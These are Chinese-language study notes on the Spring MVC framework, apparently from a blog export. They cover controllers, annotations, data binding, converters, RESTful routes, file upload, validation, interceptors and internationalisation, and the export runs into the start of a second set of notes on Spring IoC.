指在应用程序中专门用来与浏览器进行交互，展示数据的资源。在 Web 应用中，View 就是我们常说的前台页面，通常由 HTML、JSP、CSS、JavaScript 等组成。 Controller： 通常指的是，应用程序的 Servlet。它负责将用户的请求交给模型（Model）层进行处理，并将 Model 层处理完成的数据，返回给视图（View）渲染并展示给用户。 在这个过程中，Controller 层不会做任何业务处理，它只是 View（视图）层和 Model （模型）层连接的枢纽，负责调度 View 层和 Model 层，将用户界面和业务逻辑合理的组织在一起，起粘合剂的效果。 MVC的工作流程 用户发送请求到服务器； 在服务器中，请求被Controller接收； Controller调用相应的Model层处理请求； Model层处理完毕将结果返回到Controller； Controlller再根据Model返回的请求处理结果，找到相应的View视图； View视图渲染数据最终响应给浏览器。 MVC的优点 降低代码耦合性： 在 MVC 模式中，三层之间相互独立，各司其职。一旦某一层的需求发生了变化，我们就只需要更改相应层中的代码即可，而不会对其他层中的代码造成影响。 有利于分工合作： 在 MVC 模式中，将应用系统划分成了三个不同的层次，可以更好地实现开发分工。例如，网页设计人员专注于视图（View）层的开发，而那些对业务熟悉的开发人员对 Model 层进行开发，其他对业务不熟悉的开发人员则可以对 Controller 层进行开发。 有利于组件的重用： 在 MVC 中，多个视图（View）可以共享同一个模型（Model），大大提高了系统中代码的可重用性。 Spring MVCSpring MVC（Spring Web MVC）是Spring框架提供的一款基于MVC模式的轻量级Web开发框架，是Spring为表示层(UI)开发提供的一套完备的解决方案。 Spring MVC 本质是对 Servlet 的进一步封装，其最核心的组件是 DispatcherServlet，它是 Spring MVC 的前端控制器，主要负责对请求和响应的统一地处理和分发。Controller 接收到的请求其实就是 DispatcherServlet 根据一定的规则分发给它的。 Spring MVC的常用组件： 组件 提供者 描述 DispatcherServlet 框架提供 前端控制器，它是整个 Spring MVC 流程控制中心，负责统一处理请求和响应，调用其他组件对用户请求进行处理。可以降低不同组件之间的耦合性。 HandlerMapping 框架提供 处理器映射器，根据请求的 url、method 等信息查找相应的 Handler。 Handler 开发人员提供 处理器，通常被称为 Controller（控制器），相当于Servlet。它可以在 DispatcherServlet 的控制下，对具体的用户请求进行处理。 HandlerAdapter 框架提供 处理器适配器，负责调用具体的控制器方法，对用户发来的请求来进行处理。Handler执行业务方法之前，需要进行一系列的操作包括表单的数据验证、数据类型的转换、将表单数据封装到POJO等，DispatcherServlet根据HandlerAdapter执行不同的Handler。 HandlerInterceptor 处理拦截器，是一个接口，通过实现该接口完成拦截处理。 HandlerExcutionChain 处理器执行链，包括Handler和HandlerInterceptor（系统有一个默认的HandlerInterceptor，如需要额外拦截处理，则添加拦截器）。 ModelAndView 封装了模型数据和视图信息，作为Handler的处理结果返回给DispatcherServlet。 ViewResolver 框架提供 视图解析器，其职责是对视图进行解析，得到相应的物理视图，将渲染的结果响应给客户端。常见的视图解析器有 ThymeleafViewResolver、InternalResourceViewResolver 等。 View 开发人员提供 视图，它作用是将模型（Model）数据通过页面展示给用户。 Spring MVC的工作流程 用户通过浏览器发起一个 HTTP 请求，该请求会被 DispatcherServlet（前端控制器）拦截； DispatcherServlet 调用 HandlerMapping（处理器映射器）找到具体的处理器（Handler）及拦截器，最后以 HandlerExecutionChain 执行链的形式返回给 DispatcherServlet。 DispatcherServlet 将执行链返回的 Handler 信息发送给 HandlerAdapter（处理器适配器）； HandlerAdapter 根据 Handler 信息找到并执行相应的 Handler（即 Controller 控制器）对请求进行处理； Handler 执行完毕后会返回给 HandlerAdapter 一个 ModelAndView 对象（Spring MVC 的底层对象，包括 Model 数据模型和 View 视图信息）； HandlerAdapter 接收到 ModelAndView 对象后，将其返回给 DispatcherServlet ； DispatcherServlet 接收到 ModelAndView 对象后，会请求 ViewResolver（视图解析器）对视图进行解析； ViewResolver 解析完成后，会将 View 视图并返回给 DispatcherServlet； DispatcherServlet 接收到具体的 View 视图后，进行视图渲染，将 Model 中的模型数据填充到 View 视图中的 request 域，生成最终的 View（视图）； 视图负责将结果显示到浏览器（客户端）。 Spring MVC的简单使用创建Maven工程，Archetype选择org.apache.maven.archetypes:maven-archetype-webapp；导入依赖： 部署Tomcat； 在web.xml中配置 DispatcherServlet； 配置文件，&#x3D;&#x3D;springmvc.xml&#x3D;&#x3D; 创建Handler： 流程梳理： DispatcherServlet接收到URL请求/index，结合@RequestMapping(&quot;/index&quot;)注解将该请求交给index业务方法进行处理； 执行index业务代码，控制台打印日志，并返回1111字符串（逻辑视图）； 结合springmvc.xml中的视图解析器配置，找到目标资源/index.jsp，将该JSP资源返回给客户完成响应。 Spring MVC常用注解 @Controller该注解可以将一个普通的Java类标识成控制器(Controller)类。 Spring MVC 是通过组件扫描机制查找应用中的控制器类的，为了保证控制器能够被 Spring MVC 扫描到，我们还需要在 Spring MVC 的配置文件中使用 &lt;context:component-scan/&gt; 标签，指定控制器类的基本包（请确保所有控制器类都在基本包及其子包下），示例代码如下。 标注到控制器类上时，value属性值就是整个控制器类中所有控制器方法URL地址的父路径；访问该Controller下的任意控制器方法都需要带上整个路径，即/springmvc/login。 属性介绍： &#x3D;&#x3D;value&#x3D;&#x3D;value属性用来设置控制器方法的请求映射地址，值设置value属性时，value可省略；value是一个字符串类型的数组，一个value可以匹配多个请求地址；@RequestMapping(value = &#123;&quot;/register&quot;, &quot;/login&quot;&#125;) &#x3D;&#x3D;name&#x3D;&#x3D;相当于方法的注释，用于解释整个方法时用来干什么的；@RequestMapping(value = &quot;/login&quot;,name = &quot;用户登录&quot;) method用来设置控制器方法支持的请求方法，如果没有设置method属性，则表示该方法支持全部请求类型。RequestMethod是一个枚举类型，包含如下请求方式： 一个mtehod也可以设置多种请求方法；@RequestMapping(value = &quot;/toUser&quot;,method = &#123;RequestMethod.GET,RequestMethod.POST&#125;) &#x3D;&#x3D;params&#x3D;&#x3D;用于指定请求中的参数，只有当请求中携带了符合条件的参数时，控制器方法才会对该请求进行处理。通过以下四种表达式对请求的参数进行配置： “param” 请求中必须携带名为 param 的参数 “!param” 与上一个表达式的含义完全相反，请求中不能携带名为 param 的参数 “param&#x3D;value” 请求中必须携带名为 param 的参数，且参数的取值必须为：value “param!&#x3D;value” 与上一个表达式的含义完全相反，请求中不能携带参数：param &#x3D; value。 @RequestMapping(value = &quot;/testParam&quot;, params = &#123;&quot;name=admin&quot;, &quot;id=1&quot;&#125;) 只有当请求中同时携带name和id两个请求参数，且值必须为admin和1，控制器方法才会对该请求进行处理。 &#x3D;&#x3D;headers&#x3D;&#x3D;用于设置请求头信息，只有当请求中携带指定的请求头信息时，控制器方法才会处理该请求。通过以四种表达式来指定请求中的请求头信息：- “header” 请求必须携带请求头信息：header “!header” 与上一个表达式的含义完全相反，请求中不能携带请求头信息：header “header&#x3D;value” 请求中必须携带请求头信息：header&#x3D;value 。 “header!&#x3D;value” 与上一个表达式的含义完全相反，请求中不能携带请求头信息：header&#x3D;value。 @RequestMapping(value = &quot;toUser&quot;,headers = &quot;Referer=;)只有当请求头信息中包含Referer=时，该控制器方法才会处理该请求。 @CookieValuecookie映射，通过该注解来获取当前那cookie； 参数绑定@RequestParam在业务方法定义时声明参数列表，通过@RequestParam注解，将username绑定到name参数，num绑定到id参数，这样就在请求中通过usernme和num对name和id赋值。 其中，URL接收的参数值是String类型，由HandlerAdapter 将参数值转换为对应的类型传递给方法。 @PathVariableSpring MVC也支持RESTful风格的URL参数获取，通过@PathVariable注解来绑定参数，URL中以/username值/num值的形式来传入参数，要注意参数值顺序对应。 使用POJO绑定参数Spring MVC会根据请求参数名和POJO属性名进行匹配，自动为该对象填充属性值，并且支持属性级联。 导入Lombok依赖； 在web.xml中添加UTF-8编码的过滤器，要添加到servlet配置前面； &#x3D;&#x3D;addUser.jsp&#x3D;&#x3D;，属性名要与User类中的一致； 接收到客户端传入的数据后，HandlerAdapter找到对应的业务方法/add，发现需要User参数，就把客户端传入的数据封装成User对象传入。 User中也可以包含引用类型的属性，就称为级联。User类可以没有无参构造，但是级联类必须有无参构造。 JSP页面的转发和重定向Spring MVC默认以转发的形式响应JSP：return &quot;forward:/index.jsp&quot;;，如果是像上面示例一样在配置文件中加了前后缀的话，就可以写成return &quot;index&quot;;； 可以手动设置为重定向：return &quot;redirect:/index.jsp&quot;；设置重定向地址时，不能写逻辑路径，必须写明物理路径，这种写法是错误的return &quot;redirect:index&quot;; Spring MVC数据绑定数据绑定： 在后台业务方法中，直接获取前端HTTP请求中的参数。 HTTP请求传输的参数都是String类型的，Handler业务方法中的参数是开发者指定的数据类型，因此需要进行数据类型的转换。 Spring MVC的HandlerAdapter组件会在执行Handler业务方法之前，完成参数绑定，开发者直接使用即可。 @ResponseBody注解的作用是将方法的返回值以特定的格式写入到response的body区域，进而将数据返回给客户端。 基本数据类型 这里就是返回的我们自定义的格式，如果不加@ResponseBody注解，就会按照视图解析器的规则，给返回的内容添加前后缀，导致返回错误； 使用了@ResponseBody注解，传入的参数不能为空，否则会报错； 并且传入的值必须能够转换为对应类型，否则会报错。 包装类 id设置为Integer类型的话id不传值不会报错，传其他还是会报错。 @RequestParam注解可以设置参数是否必须，required属性为true时表示必须，为false表示非必须；defaultValue 属性表示不传值时id的默认值，必须写成字符串形式； 数组类型 在springmvc.xml中添加转换器解决中文乱码问题； List类型&#x3D;&#x3D;UserList.java&#x3D;&#x3D; &#x3D;&#x3D;addList.jsp&#x3D;&#x3D; JSON类型下载jquery-3.6.0.min.js，放到/webapp/js目录下，rebuild一下，在jsp中引入jquery； web.xml中添加： pom.xml中添加FastJson依赖，jar包下载：  在上面写的springmvc.xml的转换器中添加bean： &lt;bean class=&quot;com.alibaba.fastjson.support.spring.FastJsonHttpMessageConverter&quot;&gt;&lt;/bean&gt; &#x3D;&#x3D;json.jsp&#x3D;&#x3D; @RequestBody读取HTTP请求参数，通过Spring MVC提供的HttpMessageConverter接口将读取的参数转为JSON、XML格式的数据，绑定到业务方法的形参。@ResponseBody将业务方法返回的对象，提供HttpMessageConverter接口转为指定格式的数据，JSON、XML等，响应给客户端。 @RequestBody结合FastJson将JSON转换为Java Bean，好处在于如果属性为空，就不会将其转换为JSON json.jsp传入数据到/Spring_MVCTest1/jsonType，Handler中将数据转换为User对象，返回给json.jsp以JSON格式输出。 Spring MVC域对象共享数据 + 视图层解析在 Spring MVC 中，控制器在接收到 DispatcherServlet 分发过来的请求后，会继续调用 Model 层对请求进行处理。Model 层处理完请求后的结果被称为模型数据，会将模型数据返回给 Controller。Controller 在接收到 Model 层返回的模型数据后，下一步就是将模型数据通过域对象共享的方式传递给 View 视图进行渲染，最终返回给客户端展示。 域对象是服务器在内存上创建的一块存储空间，主要用不同动态资源之间的数据传递和数据共享。在 Spring MVC 中，常用的域对象有 request 域对象、session 域对象、application 域对象等（page域对象只在当前页面有效，实用性不高）。 业务数据的绑定是指将业务数据绑定给JSP域对象，业务数据的绑定是由ViewResolver来完成的，开发时，先添加业务数据，在交给ViewResolver来绑定，重点就在于如何添加业务数据。 常用域对象共享数据的方式如下： 向request域对象中共享数据1. 使用Servlet APISpring MVC可以在业务方法中直接获取Servlet原生Web资源，只需要在方法定义时 HttpServletRequest 入参即可，在方法体中直接使用request对象。 由于这种方式是通过原生 Servlet API 实现的，会导致控制器与 Servlet 容器耦合度过高，因此通常情况下，不推荐使用这种方式向 request 域对象中共享数据。 2. 使用 MapSpring MVC在调用业务方法之前会创建一个隐含对象作为业务数据的存储容器，设置业务方法的入参为Map类型，Spring MVC 会将给隐含对象的引用传递给入参。 3. 使用 Model与Map类似，业务方法通过入参来完成业务数据的绑定。 4. 使用 ModelAndViewModelAndView 即包含业务数据，同时也封装了视图信息，如果使用ModelAndView来处理业务数据，业务方法的返回值必须是ModelAndView对象。 ModelAndView 其中的model负责数据共享，view注意用于设置视图，实现页面跳转。常用方法： 添加模型数据，填充业务数据：ModelAndView addObject(String attributeName, @Nullable Object attributeValue)ModelAndView addObject(Object attributeValue) 设置视图，绑定视图信息：void setViewName(@Nullable String viewName) void setView(@Nullable View view) 在 Controller 类中，ModelAndView 只有在作为控制器方法的返回值，返回给前端控制器（DispatcherServlet）时，前端控制器解析才会去解析它。 或者： 或者： 或者： 或者： ModelAndView类有八种带参构造，大意都差不多，自行了解。 5. 使用 ModelMap 6. 使用@ModelAttribute注解定义一个方法存放要填充的数据，给该方法添加@ModelAttribute注解。 &#x3D;&#x3D;@ModelAttribute&#x3D;&#x3D;的作用是，当Handler接收到一个客户端请求之后，无论需要调用哪个业务方法，都会先调用@ModelAttribute标注的方法，并将其返回值作为业务数据，再进入到业务方法，此时业务方法只需要返回视图即可，即使对数据做出修改，数据也不会被覆盖，仍然输出@ModelAttribute方法返回的数据。 如果@ModelAttribute标注的方法存入了数据，但是返回的是void，同样也可以拿到数据； 如果同时使用@ModelAttribute标注的两个方法对同一个对象传值，直接给Model对象进行装载的优先级更高。 与上面的getUser()相比，返回的数据应该是李四。 向 session 域对象中共享数据**1. 使用 Servlet API ** 2. 使用@SessionAttributes@SessionAttributes使用在Handler类上面;业务方法默认向request域对象中共享数据，如下代码，表示将user1和user2属性共享到session域对象中（request域对象默认共享），只要业务方法中存在这两个key的数据，就会添加到session中。 向 application 域对象中共享数据使用 Servlet API通过HttpSession类型的形参获取到application域对象，如何将数据共享到application域对象中。 Spring MVC类型转换器（Converter）Spring 提供了一种 Converter（类型转换器）的类型转换工具。在 Spring MVC 中，它的作用是在控制器方法对请求进行处理前，先获取到请求发送过来的参数，并将其转换为控制器方法指定的数据类型，然后再将转换后的参数值传递给控制器方法的形参，这样后台的控制器方法就可以正确地获取请求中携带的参数了。 内置转换器1. 标量转换器 2. 集合、数组相关转换器 Spring MVC 对于基本类型（例如 int、long、float、double、boolean 以及 char 等）已经做好了基本类型转换。其他类型的转换可以自定义转换器。 注意：在使用内置类型转换器时，请求参数输入值需要与接收参数类型相兼容，否则会报 400 错误。 自定义类型转换器org.springframework.core.convert.converter包中定义了3中类型的转换器接口： 接口 说明 Converter&lt;S,T&gt; 该接口使用了泛型，第一个类型 S 表示原类型，第二个类型 T 表示目标类型，里面定义了一个 convert() 方法，能够将原类型对象作为参数传入，进行转换之后返回目标类型对象。 ConverterFactory 如果我们希望将一种类型的对象转换为另一种类型及其子类对象，例如将 String 转换为 Number 以及 Number 的子类 Integer、Double 等类型的对象，那么就需要一系列的 Converter，如 StringToInteger、StringToDouble 等。ConverterFactory&lt;S,R&gt; 接口的作用就是将这些相同系列的多个 Converter 封装在一起。 GenericConverter 该接口会根据源类对象及目标类对象的上下文信息进行类型转换。 要自定义类型转换器只需实现其中一个接口就可以了。 String类型转Date类型的转换器实现org.springframework.core.convert.converter.Converter接口；定义一个转换器： 在配置文件springmv.xml中声明一个 org.springframework.context.support.ConversionServiceFactoryBean的 Bean（例如示例配置中的名为conversionService的 Bean），然后通过其 converters 属性将自定义的所有类型转换器注册到其中；显示的装配自定义类型转换器是为了将默认注册的FormattingConversionServiceFactoryBean类型的conversionService覆盖掉。 &#x3D;&#x3D;补充：&#x3D;&#x3D; &#x3D;&#x3D;ConverterHandler.java&#x3D;&#x3D; &#x3D;&#x3D;date.jsp&#x3D;&#x3D; 运行结果： 程序运行时，第一次输入的参数会先进入转换器的构造方法方法中，然后再进入convert方法，最后到达Handler中；第二次输入参数时，会直接进convert方法，再进入Handler。 String类型转Student类型的转换器再springmvc.xml中的自定义类型转换器配置中添加bean：&lt;bean class=&quot;Converter.StudentConverter&quot;&gt;&lt;/bean&gt; &#x3D;&#x3D;Student.java&#x3D;&#x3D; &#x3D;&#x3D;student.jsp&#x3D;&#x3D; 转换器，&#x3D;&#x3D;StudentConverter.jsva&#x3D;&#x3D; Handler： 运行结果： Spring MVC 实现RESTfulRESTful（REST 风格）是一种当前比较流行的互联网软件架构模式，它充分并正确地利用 HTTP 协议的特性，为我们规定了一套统一的资源获取方式，以实现不同终端之间（客户端与服务端）的数据访问与交互。 什么是RESTResource Representational State Transfer 的缩写，译为“资源表述状态转移”。 Resource（资源）指网络中的某个具体文件，可以是一个类、一个 HTML 文件、一个 CSS 文件、一个 JS 文件、数据库中的一张表、一段文本、一张图片、一段音频等等，是网络中真实存在的一个实体。这些资源都有一个共同的特征，那就是它们都可以通过一个 URI（统一资源标识符） 进行标识，任何对于该资源的操作都不能改变其 URI。想要获取这个资源，只要访问它的 URI 即可。 Representation（资源的表述）指是资源在某个特定时刻的状态的描述，即资源的具体表现形式，它可以有多种格式，例如 HTML、XML、JSON、纯文本、图片、视频、音频等等。通常情况下，服务端与客户端资源的表述所有使用的格式往往是不同的，例如在服务端资源可能是数据库中的一段纯文本、一个 XML 文件、或者是数据库中的一张表，而客户端则可能是表现为 HTML 页面、JSON、甚至是音频和视频。 State Transfer（状态转移）客户端与服务端进行交互时，资源从一种表现形式转换到另一种表现形式的过程。但是 HTTP 协议是一种无状态协议，它是无法保存任何状态的，因此如果客户端想要获取服务器上的某个资源，就必须通过某种手段让资源在服务器端发生“状态转化”，而这种状态转化又是建立在应用的表现层（UI）上的。这就是“表现层资源状态转移”的含义。 RESTfulRESTful的特点： URL传参更简洁，不需要写参数名，允许通过/将参数值拼接到URL中； 传统URL形式： RESTful形式： 提供了一套规范来完成不同终端之间的资源共享；四种与资源相关的基本操作： GET 用来获取资源， POST 用来新建资源， PUT 用来更新资源， DELETE 用来删除资源。客户端通过这四种请求方式，即可实现对服务器端资源状态转移的描述。 实现RESTful1. 通过@RequestMapping +@PathVariable 注解的方式这种方式前面提到过，使用这两个注解来对参数进行绑定； 2. 通过 HiddenHttpMethodFilter 对请求进行过滤在传统Web开发中，form 只支持 GET 和 POST 请求方式，不支持 PUT 和 DELETE 请求方式，现在可以通过 Spring MVC 提供的 HiddenHttpMethodFilter 过滤器将 POST 请求转为 PUT 和 DELETE 请求。 过滤器的实现原理是：检测请求参数中是否包含_method参数，如果包含，则取出它的值，根据值转换为相应的请求类型，然后将请求进行传递给服务器。 实现步骤： 在web.xml中配置HiddenHttpMethodFilter； 在 form 表单中添加隐藏标签，name 为_method，value 为 PUT &#x2F; DELETE； 定义Handler。 示例实现课程的增、删、改、查。 web.xml配置过滤器； pom.xml添加JSTL依赖； 注意修改springmvc.xml中自动扫描配置所扫描的包名，要能扫描到我们使用的所有类，我这里修改成父包springmvc；&lt;context:component-scan base-package=&quot;springmvc&quot;&gt;&lt;/context:component-scan&gt; &#x3D;&#x3D;CourseRepository.java&#x3D;&#x3D; &#x3D;&#x3D;CourseHandler.java&#x3D;&#x3D; &#x3D;&#x3D;index.jsp&#x3D;&#x3D; &#x3D;&#x3D;save.jsp&#x3D;&#x3D; &#x3D;&#x3D;edit.jsp&#x3D;&#x3D; 运行结果： Spring MVC 实现文件的上传、下载单文件上传底层使用的是Apache Commons-FileUpload 组件实现上传功能，Spring MVC只是对其进行了封装，简化开发。pom.xml中导入依赖： 在web.xml中添加如下配置，使用默认方法加载png、jpg等类型图片，否则加载不出来。 在springmvc.xml中定义文件上传解析器：&lt;bean id=&quot;multipartResolver&quot; class=&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;&gt;&lt;/bean&gt; CommonsMultipartResolver实现了MultipartResolver接口，该接口用于处理文件上传；当收到请求时，DispatcherServlet 的 checkMultipart() 方法会调用 MultipartResolver 的 isMultipart() 方法判断请求中是否包含文件；如果请求数据中包含文件，则调用 MultipartResolver 的 resolveMultipart() 方法对请求的数据进行解析，然后将文件数据解析成 MultipartFile 并封装在 MultipartHttpServletRequest (继承了 HttpServletRequest) 对象中，最后传递给 Controller。 MultipartFile 封装了请求数据中的文件，此时这个文件存储在内存中或临时的磁盘文件中，需要将其转存到一个合适的位置，因为请求结束后临时存储将被清空。MultipartFile 接口中包含那多种获取文件信息的方法。 &#x3D;&#x3D;upload.jsp&#x3D;&#x3D; &#x3D;&#x3D;FileHandler.java&#x3D;&#x3D; 程序中获取到的path是本工程在Tomcat下的路径，不是工程创建的路径； 保存路径的src与 Configurations 中设置的 Application context 有关，在该目录下创建/file文件夹； 图片上传结果： 多文件上传多文件上传其实就是在单文件上传的基础上加个 for 循环。 &#x3D;&#x3D;uploads.jsp&#x3D;&#x3D; Handler业务方法： 运行结果： 文件下载在JSP中添加超链接，点击超链接进行下载。 &#x3D;&#x3D;download.jsp&#x3D;&#x3D; Handler中的业务方法： 先将图片上传上去，再下载，运行结果： Spring MVC 数据校验Spring MVC 提供了两种数据校验的组件： 基于 Validator 接口 使用 Annotation JSR-303标准校验 使用基于 Validator 接口进行校验会复杂一些，具体的数据校验的规则需要开发者手动设置。使用 Annotation JSR-303标准会相对简单一堆，开发者不需要编写校验规则，直接通过注解的形式给每一条数据添加验证规则，具体操作是直接在实体类的属性上添加对应的校验注解即可。 基于 Validator 接口定义一个实体类； 自定义数据校验器 PersonValidation，实现org.springframework.validation.Validator接口，重写抽象方法，加入校验规则； Handler业务方法： 在springmvc.xml中配置数据校验器； &#x3D;&#x3D;login.jsp&#x3D;&#x3D; 先到/Spring_MVCTest1/validate/login进行数据绑定，如果校验失败则会出现提示信息，校验成功则跳转。 程序运行流程：访问/Spring_MVCTest1/validate/login，会先到 Handler 的login方法中绑定 Person 对象； 然后到校验器的supports方法中判断绑定对象是否是 Person 类； 接着到validate方法中进行校验，如果传入的是空，errors中则会存储错误信息，这里分别存到name和pwd中； 最后到 Handler 中判断校验是否出错，bindingResult中存的就是 errors 的错误信息，if 为真，返回login.jsp，如果没有错误信息就返回success.jsp； 前端login.jsp中的&lt;form:errors&gt;标签，就会根据 path 的值输出对应的错误信息内容。 Annotation JSR-303标准校验JSR-303 是 Java EE 6 中的一项子规范，叫做 Bean Validation，官方参考实现是hibernate Validator，通过注解完成校验规则的绑定。 pom.xml中导入如下依赖： 定义一个实例类： 业务方法： 在springmvc.xml中添加配置（把基于 Validator 接口的配置注释掉）；&lt;mvc:annotation-driven&gt;&lt;/mvc:annotation-driven&gt; &#x3D;&#x3D;register.jsp&#x3D;&#x3D; 运行结果： Spring MVC拦截器拦截器（Interceptor）是 Spring MVC 提供的一种强大的功能组件。它可以对用户请求进行拦截，并在请求进入控制器（Controller）之前、控制器处理完请求后、甚至是渲染视图后，执行一些指定的操作。 在 Spring MVC 中，拦截器的作用与 Servlet 中的过滤器类似，它主要用于拦截用户请求并做相应的处理，例如通过拦截器，我们可以执行权限验证、记录请求信息日志、判断用户是否已登录等操作。 Spring MVC 拦截器使用的是可插拔式的设计，如果我们需要某一拦截器，只需在配置文件中启用该拦截器即可；如果不需要这个拦截器，则只要在配置文件中取消应用该拦截器即可。 验证登录身份示例登录页面，&#x3D;&#x3D;login.jsp&#x3D;&#x3D; 登录成功显示页面，&#x3D;&#x3D;success.jsp&#x3D;&#x3D; Handler： Spring MVC 在org.springframework.web.servlet包中提供了一个 HandlerInterceptor 接口，该接口包含 3 个方法： 方法名 返回值 说明 preHandle () boolean 该方法在控制器方法之前执行，其返回值用来表示是否中断后续操作。返回值为 true 时，表示继续向下执行；返回值为 false 时，表示中断后续的操作。 postHandle (） void 该方法会在控制器方法调用之后，解析式图之前执行。我们可以通过此方法对请求域中的模型（Model）数据和视图做出进一步的修改。 afterCompletion () void 该方法会在整个请求完成后，即视图渲染结束之后执行。我们可以通过该方法实现资源清理、日志记录等工作。 定义拦截器： 在springmvc.xml中通过&lt;mvc:interceptors&gt;标签配置拦截器； 当直接访问/Spring_MVCTest1/interceptor/main会被拦截器拦截，验证是否登录，未登录返回错误信息；正确登录就跳转到success.jsp。 Spring MVC 表单标签库使用 Spring MVC 表单标签库可以直接将业务数据绑定到JSP表单中，简化了JSP页面的代码编写。 简单使用需要在JSP页面中导入Spring MVC 表单标签库；&lt;%@ taglib prefix=&quot;form&quot; uri=&quot;; %&gt; 通过 modelAttribute 属性将 form 表单与业务数据进行绑定， 属性值设为Handler中向 model 对象存值时的 name。 示例，使用&lt;form:input&gt;标签进行输入操作： 等价于下面的代码，显然使用表单标签库简洁许多。 Handler： 常用标签 form 标签&lt;form:form modelAttribute=&quot;student&quot; method=&quot;post&quot;&gt;&lt;/form:form&gt;渲染的时 HTML 中的&lt;form&gt;&lt;/form&gt;，通过 modelAttribute 属性绑定具体的业务数据。 input 标签&lt;form:input path=&quot;id&quot;&gt;&lt;/form:input&gt;渲染的时 HTML 中的&lt;input type=&quot;text&quot; name=&quot;id&quot;/&gt;，通过 path 属性与业务数据的属性名对应，支持级联。 password 标签&lt;form:password path=&quot;password&quot;&gt;&lt;/form:password&gt;渲染的是 HTML 中的&lt;input type=&quot;password&quot; /&gt;，通过 path 与页数数据的属性名对应，该标签的值不会在页面显示（空白的）。 checkbox 标签&lt;form:chexkbox path=&quot;hobby&quot; value=&quot;读书&quot;&gt;读书&lt;/form:chexkbox&gt;渲染的是 HTML 中的&lt;input type=&quot;checkbox&quot; /&gt;，通过 path 与业务数据的属性名对应，可以绑定Boolean、数据和集合；如果绑定Boolean类型的遍历，该变量值为 true，表示选中，为 false 表示不选中； 如果绑定数组和集合类型，集合中的元素等于 checkbox 的 value 值，则表示选中该选项，否则为不选中。 checkboxs 标签&lt;form:checkboxs items=&quot;$&#123;student.hobby&#125;&quot; path=&quot;selectHobby&quot;&gt;&lt;/form:checkboxs&gt;渲染的是 HTML 中的&lt;input type=&quot;checkbox&quot;/&gt;，需要结合 items 和path 两个属性来使用；items 绑定被遍历的数组或集合，path 绑定选中的集合或数组，items 是全部选项，要用EL表达式， path 为默认选中的选项。 radiobuttton 标签&lt;form:radiobutton path=&quot;radioId&quot; value=&quot;0&quot;&gt;&lt;/form:radiobutton&gt;渲染的是 HTML 中的&lt;input type=&quot;radio&quot;/&gt; ，绑定的数据与标签的 value 值相等则为选中状态，反之为不选中。 radiobutttons 标签&lt;form:radiobutttons items=&quot;$&#123;student.grade&#125;&quot; path=&quot;selectSex&quot;&gt;&lt;/form:radiobutttons&gt;渲染的是 HTML 中的&lt;input type=&quot;radio&quot; /&gt;，需要结合 items 和path 两个属性来使用；items 绑定被遍历的数组或集合，path 绑定选中的值。与 checkboxs 类似，不过 path 为单选。 select 标签&lt;form:select items=&quot;$&#123;student.cities&#125;&quot; path=&quot;selectcity&quot;&gt;&lt;/form:select&gt;渲染的是 HTML 中的&lt;select&gt;标签，与 radiobutttons 用法一致。 option 标签 path 与 value 相等的选项默认选中。 options 标签 items 中的 path 选项默认选中，与 select 标签效果一致。 Spring MVC 国际化国际化是指同一个应用程序在不同语言设置的浏览器中，自动显示相应的语言，Spring MVC 对国际化做了很好的集成，只需要简单配置即可实现国际化。 在springmvc.xml中添加如下配置： 其中： ReloadableResourceBundleMessageSource：对资源文件中设置的内容进行绑定； LocaleChangeInterceptor：用于获取请求中的国际化信息并将其转换为 Locale 对象，以获取 LocaleResolver 对象对国际化资源文件进行解析； SessionLocaleResolver：将将包含了国际化信息的 Locale 对象存储在 Session 中，供后续页面继续使用。 在resource目录下创建国际化资源文件，文件名格式为：基本名_语言代码_国家或地区代码：&#x3D;&#x3D;language_en_US.properties&#x3D;&#x3D; 得用Unicode编码，不然会乱码，&#x3D;&#x3D;language_zh_CN.properties&#x3D;&#x3D; 默认是英文页面，通过URL中lang参数来改变语言，运行结果："},{"title":"Spring学习笔记","date":"2022-09-19T11:32:30.000Z","url":"/2022/09/19/Spring%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","categories":[[" ",""]],"content":"概述Spring是一个企业级的开发框架，是软件设计层面的框架，是一种基于Bean的编程技术，使很多复杂的代码变得优雅和简洁。 在实际开发中，服务器端应用程序通常采用三层体系架构，分别为表现层（web）、业务逻辑层（service）、持久层（dao）。 在表现层提供了对 Spring MVC、Struts2 等框架的整合； 在业务逻辑层提供了管理事务和记录日志的功能； 在持久层还可以整合 MyBatis、Hibernate 和 JdbcTemplate 等技术，对数据库进行访问。 Spring Framework的特点： 方便解耦，简化开发 方便集成各种优秀框架 降低Java EE API的使用难度 方便程序的测试 AOP编程的支持 声明式事务的支持 Spring有两个核心的部分：IoC和AOP。IoC： Inverse of Control ，译为“控制反转”，指把创建对象过程交给 Spring 进行管理。AOP： Aspect Oriented Programming ，译为“面向切面编程”。AOP 用来封装多个类的公共行为，将那些与业务无关，却为业务模块所共同调用的逻辑封装起来，减少系统的重复代码，降低模块间的耦合度。另外，AOP 还解决一些系统层面上的问题，比如日志、事务、权限等。 Bean定义由 Spring IoC 容器管理的对象称为 Bean，Bean 是根据 Spring 配置文件中的信息创建。 Spring 配置文件支持两种格式，即 XML 文件格式和 Properties 文件格式： Properties 配置文件主要以 key-value 键值对的形式存在，只能赋值，不能进行其他操作，适用于简单的属性配置。 XML 配置文件采用树形结构，结构清晰，相较于 Properties 文件更加灵活。但是 XML 配置比较繁琐，适用于大型的复杂的项目。 通常使用XML格式。 &lt;beans&gt;标签下常用的属性有： id：Bean的唯一标识符； name：Bean的名称，可以通过name属性为同一个Bean同时指定多个名称，用逗号分隔； class，指定Bean的实现类，必须使用全类名； scope：表示Bean的作用域； constructor-arg：&lt;bean&gt;的子元素，传入构造参数； property，&lt;bean&gt;元素的子元素，用于调用 Bean 实例中的 setter 方法对属性进行赋值，从而完成属性的注入。 IoC控制反转，它不是一门技术，而是一种设计思想，是一个重要的面向对象编程法则，能够指导我们如何设计出松耦合、更优良的程序。 什么是控制反转：在传统的Java应用中，要调用对象时，通常由调用者new出被调用者的对象；而在Spring框架中，是由IoC容器来创建对象的，然后再给调用者，就是所谓的“控制反转”。IoC好处在于解耦合。 依赖注入（DI）Denpendency Injection，在面向对象中，对象和对象之间是存在一种叫做“依赖”的关系。简单来说，依赖关系就是在一个对象中需要用到另外一个对象，即对象中存在一个属性，该属性是另外一个类的对象。 依赖注入本质上是 Spring Bean 属性注入的一种，只不过这个属性是一个对象属性而已。 IoC容器IoC 思想基于 IoC 容器实现的，IoC 容器底层其实就是一个 Bean 工厂。Spring 框架为我们提供了两种不同类型 IoC 容器，它们分别是 BeanFactory 和 